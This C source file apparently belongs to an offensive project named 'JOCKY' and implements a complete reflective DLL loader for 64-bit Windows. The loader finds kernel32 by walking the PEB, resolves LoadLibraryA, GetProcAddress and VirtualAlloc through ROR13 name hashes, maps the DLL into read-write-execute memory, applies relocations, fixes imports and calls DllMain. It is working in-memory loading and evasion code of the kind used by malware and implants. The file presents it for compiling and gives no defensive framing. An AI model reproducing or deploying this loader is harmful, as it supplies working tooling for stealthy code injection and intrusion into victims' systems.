/*
 * JOCKY — Phase 10: Reflective DLL Loader (cleaned, static helpers)
 * ===================================================================
 * Fully position-independent — no global variables.
 * Internal helpers are static; only ReflectiveLoader is exported.
 *
 * Compile:
 *   clang -c reflective_loader.c -o reflective_loader.obj \
 *         -fno-stack-protector -O0 -fno-builtin -fPIC -Wno-#warnings
 */

#include "reflective_loader.h"
#include <intrin.h>

#define HASH_LOADLIBRARYA    0xEC0E4E8EUL
#define HASH_GETPROCADDRESS  0x7C0DFCAAUL
#define HASH_VIRTUALALLOC    0x91AFCA54UL

/* ── ROR13 hash (static) ────────────────────────────────────────────────── */
static DWORD ror13_hash(const char *name)
{
    DWORD h = 0;
    while (*name) {
        h = (h >> 13) | (h << 19);
        h += (DWORD)(unsigned char)*name++;
    }
    return h;
}

/* ── Inline uppercase conversion ────────────────────────────────────────── */
static wchar_t upcase(wchar_t c)
{
    if (c >= L'a' && c <= L'z')
        c -= 0x20;
    return c;
}

/* ── Check if wide string equals "KERNEL32.DLL" (no static data) ────────── */
static int is_kernel32(const wchar_t *name)
{
    if (!name) return 0;
    if (upcase(*name++) != L'K') return 0;
    if (upcase(*name++) != L'E') return 0;
    if (upcase(*name++) != L'R') return 0;
    if (upcase(*name++) != L'N') return 0;
    if (upcase(*name++) != L'E') return 0;
    if (upcase(*name++) != L'L') return 0;
    if (upcase(*name++) != L'3') return 0;
    if (upcase(*name++) != L'2') return 0;
    if (upcase(*name++) != L'.') return 0;
    if (upcase(*name++) != L'D') return 0;
    if (upcase(*name++) != L'L') return 0;
    if (upcase(*name++) != L'L') return 0;
    return *name == L'\0';
}

/* ── Robust PEB walk (static) ───────────────────────────────────────────── */
static ULONG_PTR find_kernel32(void)
{
    ULONG_PTR peb = __readgsqword(0x60);
    if (!peb) return 0;
    ULONG_PTR ldr = *(ULONG_PTR *)(peb + 0x18);
    if (!ldr) return 0;

    ULONG_PTR list_offsets[] = { 0x10, 0x20 };
    for (int li = 0; li < 2; li++) {
        ULONG_PTR list_head = ldr + list_offsets[li];
        ULONG_PTR flink     = *(ULONG_PTR *)list_head;
        while (flink && flink != list_head) {
            ULONG_PTR entry = flink;
            if (li == 1) entry = flink - 0x10;

            ULONG_PTR dll_base = *(ULONG_PTR *)(entry + 0x30);
            if (!dll_base) { flink = *(ULONG_PTR *)flink; continue; }

            wchar_t *name;
            int found = 0;
            name = *(wchar_t **)(entry + 0x70);
            if (name && is_kernel32(name)) found = 1;
            if (!found) {
                name = *(wchar_t **)(entry + 0x60);
                if (name && is_kernel32(name)) found = 1;
            }
            if (!found) { flink = *(ULONG_PTR *)flink; continue; }

            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
                flink = *(ULONG_PTR *)flink; continue;
            }
            PIMAGE_NT_HEADERS64 nt =
                (PIMAGE_NT_HEADERS64)(dll_base + dos->e_lfanew);
            if (nt->Signature != IMAGE_NT_SIGNATURE) {
                flink = *(ULONG_PTR *)flink; continue;
            }
            DWORD exp_rva = nt->OptionalHeader
                              .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                              .VirtualAddress;
            if (exp_rva == 0) { flink = *(ULONG_PTR *)flink; continue; }
            return dll_base;
        }
    }
    return 0;
}

/* ── Find export by hash (static) ───────────────────────────────────────── */
static ULONG_PTR find_export(ULONG_PTR base, DWORD target_hash)
{
    if (!base) return 0;
    PIMAGE_DOS_HEADER   dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS64 nt  = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    DWORD exp_rva = nt->OptionalHeader
                      .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + exp_rva);
    DWORD *names     = (DWORD *)(base + exp->AddressOfNames);
    DWORD *functions = (DWORD *)(base + exp->AddressOfFunctions);
    WORD  *ordinals  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(base + names[i]);
        if (ror13_hash(name) == target_hash)
            return base + functions[ordinals[i]];
    }
    return 0;
}

/* ── Function pointer types ─────────────────────────────────────────────── */
typedef HMODULE (WINAPI *PFN_LoadLibraryA)  (LPCSTR);
typedef FARPROC (WINAPI *PFN_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *PFN_VirtualAlloc)  (LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *PFN_DllMain)       (HINSTANCE, DWORD, LPVOID);

/* ── Main ReflectiveLoader (exported) ───────────────────────────────────── */
__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID dll_base_param)
{
    ULONG_PTR dll_base = (ULONG_PTR)dll_base_param;
    if (!dll_base) return 1;
    if (*(WORD *)dll_base != IMAGE_DOS_SIGNATURE) return 2;

    ULONG_PTR k32_base = find_kernel32();
    if (!k32_base) return 3;

    PFN_LoadLibraryA pLoadLibraryA =
        (PFN_LoadLibraryA) find_export(k32_base, HASH_LOADLIBRARYA);
    if (!pLoadLibraryA) return 41;

    PFN_GetProcAddress pGetProcAddress =
        (PFN_GetProcAddress) find_export(k32_base, HASH_GETPROCADDRESS);
    if (!pGetProcAddress) return 42;

    PFN_VirtualAlloc pVirtualAlloc =
        (PFN_VirtualAlloc) find_export(k32_base, HASH_VIRTUALALLOC);
    if (!pVirtualAlloc) return 43;

    PIMAGE_DOS_HEADER   dos = (PIMAGE_DOS_HEADER)dll_base;
    PIMAGE_NT_HEADERS64 nt  = (PIMAGE_NT_HEADERS64)(dll_base + dos->e_lfanew);
    DWORD size_of_image   = nt->OptionalHeader.SizeOfImage;
    DWORD size_of_headers = nt->OptionalHeader.SizeOfHeaders;
    ULONGLONG preferred   = nt->OptionalHeader.ImageBase;
    DWORD ep_rva          = nt->OptionalHeader.AddressOfEntryPoint;
    WORD num_sections     = nt->FileHeader.NumberOfSections;

    BYTE *new_base = (BYTE *)pVirtualAlloc(
        NULL, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!new_base) return 6;

    BYTE *src = (BYTE *)dll_base;
    BYTE *dst = new_base;
    for (DWORD i = 0; i < size_of_headers; i++) dst[i] = src[i];

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < num_sections; i++) {
        if (sec[i].SizeOfRawData == 0) continue;
        BYTE *sec_dst = new_base + sec[i].VirtualAddress;
        BYTE *sec_src = (BYTE *)dll_base + sec[i].PointerToRawData;
        for (DWORD j = 0; j < sec[i].SizeOfRawData; j++) sec_dst[j] = sec_src[j];
    }

    LONGLONG delta = (LONGLONG)new_base - (LONGLONG)preferred;
    if (delta != 0) {
        DWORD reloc_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD reloc_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (reloc_rva && reloc_size) {
            BYTE *reloc_ptr = new_base + reloc_rva;
            BYTE *reloc_end = reloc_ptr + reloc_size;
            while (reloc_ptr < reloc_end) {
                PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)reloc_ptr;
                if (!block->VirtualAddress) break;
                if (block->VirtualAddress >= size_of_image) break;
                if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) break;
                DWORD n_entries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entries = (WORD *)(block + 1);
                for (DWORD i = 0; i < n_entries; i++) {
                    if ((entries[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG *target = (ULONGLONG *)(new_base + block->VirtualAddress + (entries[i] & 0x0FFF));
                        if ((BYTE *)target >= new_base &&
                            (BYTE *)target + sizeof(ULONGLONG) <= new_base + size_of_image)
                            *target += (ULONGLONG)delta;
                    }
                }
                reloc_ptr += block->SizeOfBlock;
            }
        }
    }

    DWORD import_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (import_rva) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(new_base + import_rva);
        while (imp->Name) {
            const char *dep_name = (const char *)(new_base + imp->Name);
            HMODULE dep_mod = pLoadLibraryA(dep_name);
            if (!dep_mod) { imp++; continue; }

            ULONG_PTR *thunk_ref = (ULONG_PTR *)(new_base +
                (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            ULONG_PTR *iat_ref = (ULONG_PTR *)(new_base + imp->FirstThunk);
            while (*thunk_ref) {
                if (IMAGE_SNAP_BY_ORDINAL64(*thunk_ref))
                    *iat_ref = (ULONG_PTR)pGetProcAddress(dep_mod, (LPCSTR)(IMAGE_ORDINAL64(*thunk_ref)));
                else {
                    PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(new_base + *thunk_ref);
                    *iat_ref = (ULONG_PTR)pGetProcAddress(dep_mod, (LPCSTR)ibn->Name);
                }
                thunk_ref++; iat_ref++;
            }
            imp++;
        }
    }

    if (ep_rva) {
        PFN_DllMain dll_main = (PFN_DllMain)(new_base + ep_rva);
        dll_main((HINSTANCE)new_base, DLL_PROCESS_ATTACH, NULL);
    }

    return (ULONG_PTR)new_base;
}